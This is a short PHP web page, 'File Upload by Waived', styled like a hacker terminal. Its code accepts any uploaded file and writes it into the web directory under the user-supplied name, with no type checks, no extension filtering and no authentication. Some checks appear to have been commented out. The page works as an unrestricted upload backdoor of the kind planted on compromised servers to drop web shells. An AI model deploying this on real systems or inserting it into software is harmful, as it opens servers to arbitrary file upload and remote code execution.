<!DOCTYPE html>
<html>
<head>
    <title>github.com/waived</title>
    <style>
        body {
            font-family: monospace;
            background-color: black;
            color: lime;
        }
        textarea:focus {
            outline: none;
        }
        textarea {
            background-color: green;
            color: lime;
            border: 1px solid lime;
            padding: 1px;
            width: 800px;
            height: 90px;
            resize: both;
            overflow: auto;
        }
        .ui-resizable-handle {
            background-color: lime;
            width: 10px;
            height: 10px;
            border: 2px solid #333;
            cursor: se-resize;
        }
    </style>
</head>
<body>

<h1>File Upload by Waived</h1>

<?php
$uploadDir = ""; // upload directory. blank = current directory

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["submit"])) {
    // Check if file was uploaded without errors
    if (isset($_FILES["fileToUpload"]) && $_FILES["fileToUpload"]["error"] == UPLOAD_ERR_OK) {
        // File details
        $fileName = basename($_FILES["fileToUpload"]["name"]);
        $fileTmpName = $_FILES["fileToUpload"]["tmp_name"];
        $fileSize = $_FILES["fileToUpload"]["size"];

        if (move_uploaded_file($fileTmpName, $uploadDir . $fileName)) {
            echo "File is successfully uploaded.";
        } else {
            echo "Failed to upload file.";
        }
            //}
        //}
    } else {
        echo "Error uploading file.";
    }
}
?>

<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload File" name="submit">
</form>

</body>
</html>
